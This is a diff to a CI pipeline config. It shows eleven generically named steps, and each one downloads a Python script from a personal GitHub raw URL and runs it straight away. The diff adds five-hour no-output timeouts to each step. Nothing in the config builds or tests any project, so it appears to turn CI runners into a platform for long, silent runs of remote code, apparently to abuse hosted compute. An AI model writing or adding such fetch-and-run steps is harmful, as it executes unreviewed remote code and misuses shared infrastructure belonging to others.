@@ -6,43 +6,53 @@ working_dir: &working_dir ~/app
         name: A
         command: |
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: B
         command: |
           sleep 10s          
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: C
         command: |
-          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py 
+          wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m 
     - run:
         name: D
         command: |
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: E
         command: |
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: F
         command: |
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: G
         command: |
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: H
         command: |
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: I
         command: |
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: J
         command: |
           wget https://raw.githubusercontent.com/gyrogerald/mici/main/node.py && python node.py
+        no_output_timeout: 300m
     - run:
         name: K
         no_output_timeout: 300m
